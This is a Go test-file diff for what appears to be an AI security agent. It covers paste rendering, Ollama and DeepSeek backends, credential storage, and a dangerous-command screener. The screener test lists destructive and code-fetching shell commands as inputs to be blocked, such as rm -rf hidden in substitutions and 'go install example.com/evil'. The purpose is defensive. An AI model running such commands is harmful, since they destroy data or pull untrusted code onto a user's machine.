@@ -17,6 +17,129 @@ import (
 	"time"
 )
 
+type roundTripFunc func(*http.Request) (*http.Response, error)
+
+func (fn roundTripFunc) RoundTrip(request *http.Request) (*http.Response, error) {
+	return fn(request)
+}
+
+func TestRenderEditableInputShowsLongPasteAsReadableBlock(t *testing.T) {
+	prompt := "\x1b[96myou>\x1b[0m "
+	raw := strings.Repeat("abcdefghij", 30)
+	line := []rune(raw)
+	display := renderEditableInput(prompt, line, len(line), 32, true)
+	plain := ansiCSIRe.ReplaceAllString(display.text, "")
+	rows := strings.Split(plain, "\r\n")
+	if len(rows) < 4 {
+		t.Fatalf("long paste did not wrap into a block: %q", plain)
+	}
+	if !strings.Contains(rows[0], "pasted input") || !strings.HasSuffix(rows[len(rows)-1], "└─") {
+		t.Fatalf("paste block header/footer missing: %q", plain)
+	}
+
+	prefix := strings.Repeat(" ", visibleLen(prompt)) + "│ "
+	var recovered strings.Builder
+	for _, row := range rows[1 : len(rows)-1] {
+		if !strings.HasPrefix(row, prefix) {
+			t.Fatalf("unaligned paste row %q (prefix %q)", row, prefix)
+		}
+		recovered.WriteString(strings.TrimPrefix(row, prefix))
+		cells := 0
+		for _, r := range row {
+			cells += editableRuneWidth(r)
+		}
+		if cells >= 32 {
+			t.Fatalf("rendered row entered terminal wrap column: cells=%d row=%q", cells, row)
+		}
+	}
+	if recovered.String() != raw {
+		t.Fatalf("render changed pasted text: got %d chars, want %d", recovered.Len(), len(raw))
+	}
+	if display.cursorRow >= display.endRow || display.cursorCol >= 32 {
+		t.Fatalf("cursor/footer geometry invalid: %#v", display)
+	}
+	if strings.Contains(strings.ReplaceAll(display.text, "\r\n", ""), "\n") {
+		t.Fatal("renderer emitted a bare LF instead of explicit CRLF geometry")
+	}
+}
+
+func TestRenderEditableInputPreservesLinesUnicodeAndNeutralizesControls(t *testing.T) {
+	raw := "first line\nsecond 世界 U0001f50d\nunsafe \x1b[2J text"
+	line := []rune(raw)
+	display := renderEditableInput("you> ", line, len([]rune("first line\nsecond")), 48, true)
+	plain := ansiCSIRe.ReplaceAllString(display.text, "")
+	for _, want := range []string{"first line", "second 世界 U0001f50d", "unsafe ␛[2J text"} {
+		if !strings.Contains(plain, want) {
+			t.Fatalf("rendered block omitted %q: %q", want, plain)
+		}
+	}
+	if strings.Contains(display.text, "\x1b[2J") {
+		t.Fatal("pasted terminal escape sequence was emitted instead of displayed safely")
+	}
+	if string(line) != raw {
+		t.Fatalf("renderer mutated underlying input: %q", string(line))
+	}
+	if display.cursorRow <= 1 || display.cursorRow >= display.endRow {
+		t.Fatalf("multiline cursor is not inside content block: %#v", display)
+	}
+}
+
+func TestEditableInputViewportKeepsHugePasteCursorVisible(t *testing.T) {
+	line := []rune(strings.Repeat("0123456789", 200))
+	full := renderEditableInput("you> ", line, len(line), 24, true)
+	if full.endRow < 50 {
+		t.Fatalf("test input did not produce a tall block: %#v", full)
+	}
+	view := viewportEditableInput(full, 10)
+	rows := strings.Split(view.text, "\r\n")
+	if len(rows) > 10 {
+		t.Fatalf("viewport has %d rows, terminal has 10", len(rows))
+	}
+	if view.cursorRow < 0 || view.cursorRow >= len(rows) || view.endRow != len(rows)-1 {
+		t.Fatalf("viewport cursor geometry invalid: %#v rows=%d", view, len(rows))
+	}
+	plain := ansiCSIRe.ReplaceAllString(view.text, "")
+	if !strings.Contains(plain, "rows above") || !strings.Contains(plain, "└─") {
+		t.Fatalf("end-of-paste viewport lacks context/footer: %q", plain)
+	}
+
+	startView := viewportEditableInput(renderEditableInput("you> ", line, 0, 24, true), 10)
+	startPlain := ansiCSIRe.ReplaceAllString(startView.text, "")
+	if !strings.Contains(startPlain, "pasted input") || !strings.Contains(startPlain, "rows below") {
+		t.Fatalf("start-of-paste viewport lacks header/context: %q", startPlain)
+	}
+}
+
+func TestBracketedPasteStreamHandlesMarkersSplitAtEveryByte(t *testing.T) {
+	pasted := strings.Repeat("line of long pasted text\n", 400) + "tail"
+	stream := append([]byte("before"), bracketedPasteStart...)
+	stream = append(stream, []byte(pasted)...)
+	stream = append(stream, bracketedPasteEnd...)
+	stream = append(stream, []byte("after")...)
+
+	parser := &bracketedPasteStream{}
+	var normal strings.Builder
+	var gotPastes []string
+	for _, b := range stream {
+		for _, event := range parser.feed([]byte{b}) {
+			if event.pasted {
+				gotPastes = append(gotPastes, string(event.data))
+			} else {
+				normal.Write(event.data)
+			}
+		}
+	}
+	if normal.String() != "beforeafter" {
+		t.Fatalf("normal input around paste = %q", normal.String())
+	}
+	if len(gotPastes) != 1 || gotPastes[0] != pasted {
+		t.Fatalf("split-marker paste was corrupted: events=%d got=%d want=%d", len(gotPastes), len(strings.Join(gotPastes, "")), len(pasted))
+	}
+	if parser.inPaste || len(parser.pending) != 0 {
+		t.Fatalf("paste parser retained state: inPaste=%v pending=%q", parser.inPaste, parser.pending)
+	}
+}
+
 func TestParseModelResponseStatusRecovery(t *testing.T) {
 	tests := []struct {
 		name string
@@ -154,6 +277,14 @@ func TestDangerousCommandScreening(t *testing.T) {
 		"rm -rf ./cache",
 		"echo safe\nrm -rf ./cache",
 		"echo $(rm -rf ./cache)",
+		"echo `rm -rf ./cache`",
+		"cat <(rm -rf ./cache)",
+		"cat >(rm -rf ./cache)",
+		"echo $(printf safe",
+		"echo `printf safe",
+		"echo \"$(printf safe; rm -rf ./cache)\"",
+		"$(printf rm) -rf ./cache",
+		"MOD=$(go install example.com/evil)",
 		"env FOO=bar rm -rf ./cache",
 		"timeout 5 rm -rf ./cache",
 		"stdbuf -o L rm -rf ./cache",
@@ -170,6 +301,12 @@ func TestDangerousCommandScreening(t *testing.T) {
 		"printf '%s\\n' hello",
 		"timeout 5 printf ok",
 		"find . -type f -exec cat {} \\;",
+		"MODCACHE=$(go env GOMODCACHE 2>/dev/null || echo ~/go/pkg/mod); sed -n '100,150p' \"$MODCACHE/github.com/fxamacker/cbor/v2@v2.9.0/decode.go\" 2>/dev/null",
+		"echo \"$(printf safe)\"",
+		"VALUE=$(printf '%s' \"$(go env GOMODCACHE)\")",
+		"diff <(printf a) <(printf b)",
+		"VALUE=`printf safe`; printf '%s\\n' \"$VALUE\"",
+		"printf '%s\\n' 'literal $(rm -rf ./cache)'",
 	}
 	for _, cmd := range safe {
 		if isDangerous(cmd) {
@@ -469,6 +606,296 @@ func newTestHTTPServer(t *testing.T, handler http.Handler) *httptest.Server {
 	server.Listener = listener
 	server.Start()
 	return server
+}
+
+func TestOllamaServerRemoteDetection(t *testing.T) {
+	for _, endpoint := range []string{
+		"http://10.8.0.4:11434",
+		"https://gpu-box.example:11434",
+		"http://host.docker.internal:11434",
+	} {
+		if !ollamaServerIsRemote(endpoint) {
+			t.Errorf("remote endpoint classified as local: %s", endpoint)
+		}
+	}
+	for _, endpoint := range []string{
+		"http://localhost:11434",
+		"http://127.0.0.1:11434",
+		"http://[::1]:11434",
+		"http://0.0.0.0:11434",
+	} {
+		if ollamaServerIsRemote(endpoint) {
+			t.Errorf("local endpoint classified as remote: %s", endpoint)
+		}
+	}
+}
+
+func TestRemoteOllamaPlacementFromPS(t *testing.T) {
+	server := newTestHTTPServer(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/api/ps" {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, `{"models":[{"name":"secorizon:v3-q4km","model":"secorizon:v3-q4km","size":17179869184,"size_vram":12884901888,"context_length":250000}]}`)
+	}))
+	defer server.Close()
+
+	oldURL := ollamaURL
+	ollamaURL = server.URL
+	defer func() { ollamaURL = oldURL }()
+
+	info, ok := findLoadedModelInfo(listLoadedModelInfo(), "secorizon:v3-q4km")
+	if !ok {
+		t.Fatal("loaded model was not found in /api/ps response")
+	}
+	got := remoteModelPlacementDescription(info)
+	for _, want := range []string{"remote Ollama", "secorizon:v3-q4km", "75% GPU / 25% CPU", "12.0 GB model VRAM"} {
+		if !strings.Contains(got, want) {
+			t.Fatalf("placement %q omitted %q", got, want)
+		}
+	}
+}
+
+func TestRemoteOllamaPlacementHandlesCPUAndLegacyServers(t *testing.T) {
+	cpu := remoteModelPlacementDescription(ollamaProcessInfo{
+		Name: "cpu-model", Size: 8 << 30, SizeVRAM: 0, VRAMReported: true,
+	})
+	if !strings.Contains(cpu, "100% CPU") || !strings.Contains(cpu, "0 GB model VRAM") {
+		t.Fatalf("CPU placement = %q", cpu)
+	}
+	legacy := remoteModelPlacementDescription(ollamaProcessInfo{Name: "legacy-model", Size: 8 << 30})
+	if !strings.Contains(legacy, "split not reported") {
+		t.Fatalf("legacy placement = %q", legacy)
+	}
+}
+
+func TestDeepSeekChatUsesV4JSONProtocolAndUsage(t *testing.T) {
+	oldBackend, oldModel := modelBackend, model
+	oldBaseURL, oldAPIKey := cloudBaseURL, cloudAPIKey
+	oldClient, oldThink := deepSeekHTTPClient, thinkMode
+	defer func() {
+		modelBackend, model = oldBackend, oldModel
+		cloudBaseURL, cloudAPIKey = oldBaseURL, oldAPIKey
+		deepSeekHTTPClient, thinkMode = oldClient, oldThink
+	}()
+
+	var received map[string]interface{}
+	deepSeekHTTPClient = &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
+		if r.URL.String() != "https://api.deepseek.test/chat/completions" {
+			t.Fatalf("unexpected DeepSeek URL: %s", r.URL)
+		}
+		if got := r.Header.Get("Authorization"); got != "Bearer secret-deepseek-key" {
+			t.Fatalf("authorization header = %q", got)
+		}
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if strings.Contains(string(body), "secret-deepseek-key") {
+			t.Fatal("DeepSeek credential leaked into request body")
+		}
+		if err := json.Unmarshal(body, &received); err != nil {
+			t.Fatal(err)
+		}
+		content := `{"text":"task complete","command":"","search":"","status":"done"}`
+		encoded, _ := json.Marshal(map[string]interface{}{
+			"model": deepSeekDefaultModel,
+			"choices": []interface{}{map[string]interface{}{
+				"finish_reason": "stop",
+				"message":       map[string]interface{}{"role": "assistant", "content": content},
+			}},
+			"usage": map[string]interface{}{"prompt_tokens": 123, "completion_tokens": 17},
+		})
+		return &http.Response{
+			StatusCode: http.StatusOK, Status: "200 OK", Header: http.Header{},
+			Body: io.NopCloser(strings.NewReader(string(encoded))),
+		}, nil
+	})}
+	modelBackend = deepSeekProvider
+	model = deepSeekDefaultModel
+	cloudBaseURL = "https://api.deepseek.test"
+	cloudAPIKey = string(bracketedPasteStart) + "secret-deepseek-key" + string(bracketedPasteEnd)
+	thinkMode = true
+
+	result, interrupted := deepSeekChat([]message{{Role: "system", Content: technicalPrompt}, {Role: "user", Content: "finish the task"}})
+	if interrupted {
+		t.Fatal("DeepSeek turn was unexpectedly interrupted")
+	}
+	parsed := parseModelResponse(result)
+	if parsed.Status != "done" || parsed.Text != "task complete" {
+		t.Fatalf("DeepSeek response = %#v", parsed)
+	}
+	if received["model"] != deepSeekDefaultModel || received["stream"] != false {
+		t.Fatalf("request envelope = %#v", received)
+	}
+	if received["thinking"].(map[string]interface{})["type"] != "enabled" {
+		t.Fatalf("thinking control = %#v", received["thinking"])
+	}
+	if received["response_format"].(map[string]interface{})["type"] != "json_object" {
+		t.Fatalf("response format = %#v", received["response_format"])
+	}
+	streamMu.Lock()
+	activeCancel := streamCancel != nil
+	streamMu.Unlock()
+	if activeCancel {
+		t.Fatal("DeepSeek turn retained its cancellation function")
+	}
+}
+
+func TestCloudAPIKeyNormalizationAndStoredCredentialMigration(t *testing.T) {
+	stateDir := t.TempDir()
+	t.Setenv("SECORIZON_CONFIG_DIR", stateDir)
+	dirty := string(bracketedPasteStart) + "sk-test-abc\r\ndef" + string(bracketedPasteEnd) + "\n"
+	credentials := persistedCloudCredentials{
+		Version: modelSettingsVersion,
+		APIKeys: map[string]string{deepSeekProvider: dirty},
+	}
+	if err := writeCloudCredentials(credentials); err != nil {
+		t.Fatal(err)
+	}
+
+	got, err := loadCloudAPIKey(deepSeekProvider)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got != "sk-test-abcdef" {
+		t.Fatalf("normalized key length/content mismatch: got length %d", len(got))
+	}
+	reloaded, err := loadCloudCredentials()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if reloaded.APIKeys[deepSeekProvider] != got {
+		t.Fatal("normalized credential was not migrated back to private storage")
+	}
+	stored, err := os.ReadFile(cloudCredentialsPath())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(stored), "\\u001b") || strings.Contains(string(stored), "[200~") || strings.Contains(string(stored), "[201~") {
+		t.Fatal("stored credential still contains terminal paste markers")
+	}
+	if _, _, err := normalizeCloudAPIKey("sk-invalid-" + string(rune(0x1f4a5))); err == nil {
+		t.Fatal("non-ASCII credential was accepted for an HTTP header")
+	}
+}
+
+func TestDeepSeekCredentialFailureReturnsTerminalAgentStatus(t *testing.T) {
+	oldKey, oldClient := cloudAPIKey, deepSeekHTTPClient
+	defer func() {
+		cloudAPIKey, deepSeekHTTPClient = oldKey, oldClient
+	}()
+	calls := 0
+	cloudAPIKey = "invalid-" + string(rune(0x1f4a5))
+	deepSeekHTTPClient = &http.Client{Transport: roundTripFunc(func(*http.Request) (*http.Response, error) {
+		calls++
+		return nil, fmt.Errorf("transport must not be called")
+	})}
+
+	result, interrupted := deepSeekChat([]message{{Role: "user", Content: "test"}})
+	if interrupted || calls != 0 {
+		t.Fatalf("invalid credential reached transport: interrupted=%v calls=%d", interrupted, calls)
+	}
+	if parsed := parseModelResponse(result); parsed.Status != "question" {
+		t.Fatalf("provider failure did not terminate the agent loop: %#v", parsed)
+	}
+}
+
+func TestDeepSeekTransportFailureReturnsTerminalAgentStatus(t *testing.T) {
+	oldKey, oldClient := cloudAPIKey, deepSeekHTTPClient
+	defer func() {
+		cloudAPIKey, deepSeekHTTPClient = oldKey, oldClient
+	}()
+	calls := 0
+	cloudAPIKey = "valid-test-key"
+	deepSeekHTTPClient = &http.Client{Transport: roundTripFunc(func(*http.Request) (*http.Response, error) {
+		calls++
+		return nil, fmt.Errorf("simulated network failure")
+	})}
+
+	result, interrupted := deepSeekChat([]message{{Role: "user", Content: "test"}})
+	if interrupted || calls != 1 {
+		t.Fatalf("transport failure attempts: interrupted=%v calls=%d", interrupted, calls)
+	}
+	if parsed := parseModelResponse(result); parsed.Status != "question" {
+		t.Fatalf("transport failure did not terminate the agent loop: %#v", parsed)
+	}
+}
+
+func TestDeepSeekSettingsAndCredentialPersistence(t *testing.T) {
+	stateDir := t.TempDir()
+	t.Setenv("SECORIZON_CONFIG_DIR", stateDir)
+	for _, key := range []string{
+		"SECORIZON_MODEL_BACKEND", "SECORIZON_MODEL", "OLLAMA_URL",
+		"SECORIZON_CLOUD_MODEL", "DEEPSEEK_BASE_URL", "DEEPSEEK_API_KEY",
+	} {
+		t.Setenv(key, "")
+	}
+
+	oldBackend, oldModel, oldOllamaURL := modelBackend, model, ollamaURL
+	oldLocalModel, oldLocalURL := localModel, localOllamaURL
+	oldProvider, oldCloudModel := cloudProvider, cloudModel
+	oldCloudBase, oldCloudKey := cloudBaseURL, cloudAPIKey
+	defer func() {
+		modelBackend, model, ollamaURL = oldBackend, oldModel, oldOllamaURL
+		localModel, localOllamaURL = oldLocalModel, oldLocalURL
+		cloudProvider, cloudModel = oldProvider, oldCloudModel
+		cloudBaseURL, cloudAPIKey = oldCloudBase, oldCloudKey
+	}()
+
+	settings := persistedModelSettings{
+		Backend: deepSeekProvider, LocalModel: "secorizon:v3-q4km", OllamaURL: "http://10.8.0.4:11434",
+		CloudProvider: deepSeekProvider, CloudModel: deepSeekDefaultModel, CloudBaseURL: deepSeekDefaultBaseURL,
+	}
+	if err := savePersistedModelSettings(settings); err != nil {
+		t.Fatal(err)
+	}
+	if err := saveCloudAPIKey(deepSeekProvider, "secret-persisted-key"); err != nil {
+		t.Fatal(err)
+	}
+	if err := applyPersistentModelSelection(); err != nil {
+		t.Fatal(err)
+	}
+	if modelBackend != deepSeekProvider || model != deepSeekDefaultModel || cloudAPIKey != "secret-persisted-key" {
+		t.Fatalf("persistent cloud selection not restored: backend=%q model=%q key=%q", modelBackend, model, cloudAPIKey)
+	}
+
+	settingsContent, err := os.ReadFile(modelSettingsPath())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(settingsContent), "secret-persisted-key") {
+		t.Fatal("API key leaked into model settings")
+	}
+	for _, path := range []string{modelSettingsPath(), cloudCredentialsPath()} {
+		info, err := os.Stat(path)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if info.Mode().Perm() != 0o600 {
+			t.Fatalf("%s mode = %o, want 600", path, info.Mode().Perm())
+		}
+	}
+
+	t.Setenv("SECORIZON_MODEL", "secorizon:v2")
+	t.Setenv("OLLAMA_URL", "http://127.0.0.1:11434")
+	if err := applyPersistentModelSelection(); err != nil {
+		t.Fatal(err)
+	}
+	if modelBackend != localModelBackend || model != "secorizon:v2" || ollamaURL != "http://127.0.0.1:11434" {
+		t.Fatalf("explicit local environment did not override cloud default: backend=%q model=%q url=%q", modelBackend, model, ollamaURL)
+	}
+}
+
+func TestDeepSeekConfigurationRequiresHTTPSAndRedactsErrors(t *testing.T) {
+	if err := validateDeepSeekEndpoint("http://api.deepseek.com"); err == nil {
+		t.Fatal("insecure DeepSeek endpoint was accepted")
+	}
+	got := boundedCloudError([]byte(`{"error":"rejected secret-error-key"}`), "secret-error-key")
+	if strings.Contains(got, "secret-error-key") || !strings.Contains(got, "[redacted]") {
+		t.Fatalf("credential was not redacted: %q", got)
+	}
 }
 
 func TestBurpHandshakeTimeout(t *testing.T) {
